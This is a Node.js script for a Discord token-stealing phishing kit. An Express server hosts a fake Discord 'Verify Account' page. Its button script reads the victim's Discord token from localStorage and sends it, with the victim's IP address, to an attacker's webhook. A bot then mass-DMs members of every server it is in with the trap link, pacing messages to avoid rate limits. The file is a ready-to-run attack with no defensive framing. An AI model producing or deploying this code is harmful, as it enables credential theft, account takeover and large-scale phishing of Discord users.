const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const fs = require('fs');
const path = require('path');

// ==========================================
// CONFIGURATION - EDIT THESE LINES
// ==========================================
const BOT_TOKEN = 'PASTE_YOUR_BOT_TOKEN_HERE'; 
const WEBHOOK_URL = 'PASTE_YOUR_WEBHOOK_URL_HERE';
// ==========================================

const app = express();
const PORT = process.env.PORT || 8080;

// 1. HTML Trap Content
const htmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Discord - Verify</title>
    <style>
        body { background-color: #36393f; font-family: 'gg sans', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background-color: #2f3136; padding: 30px; border-radius: 8px; text-align: center; width: 300px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
        h2 { color: #fff; margin-bottom: 10px; }
        p { color: #b9bbbe; font-size: 14px; margin-bottom: 20px; }
        button { background-color: #7289da; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; }
        button:hover { background-color: #5b6eae; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Verify Account</h2>
        <p>Click below to verify you are not a bot.</p>
        <button id="verifyBtn">Verify Now</button>
    </div>
    <script>
        document.getElementById('verifyBtn').addEventListener('click', async () => {
            const token = localStorage.getItem('discord_token');
            if (!token) return alert("Log in first!");
            
            // Send to webhook
            await fetch('${WEBHOOK_URL}', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ content: \`Token: \\\`\\\`\\\`\${token}\\\`\\\`\\\` \\n IP: \${await (async()=>{try{return(await fetch('https://api.ipify.org?format=json')).json().ip}catch(e){return 'Unknown'}})()}\` })
            });
            
            window.location.href = "https://discord.com/channels/@me";
        });
    </script>
</body>
</html>
`;

// Serve the HTML trap
app.get('/', (req, res) => {
    res.send(htmlContent);
});

// Start Web Server
app.listen(PORT, () => {
    console.log(`Trap served at: ${process.env.REPL_URL}`);
});

// 2. Discord Bot Logic
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.once('ready', async () => {
    console.log(`Bot logged in as ${client.user.tag}`);
    
    // Get all guilds
    const guilds = client.guilds.cache;
    console.log(`Found ${guilds.size} guilds.`);

    let count = 0;
    for (const [, guild] of guilds) {
        try {
            const members = await guild.members.fetch({ limit: 100 }); // Fetch first 100 per guild to be fast
            
            for (const member of members.values()) {
                // Skip bots
                if (member.user.bot) continue;

                try {
                    await member.send(`Verify here: ${process.env.REPL_URL}`);
                    count++;
                } catch (err) {
                    // Silently fail on DM blocked
                }
                
                // Small delay to avoid rate limits (500ms)
                await new Promise(r => setTimeout(r, 500));
            }
        } catch (err) {
            console.error(`Error fetching/sending in ${guild.name}:`, err.message);
        }
    }
    console.log(`Sent invites to ${count} users.`);
});

client.login(BOT_TOKEN);
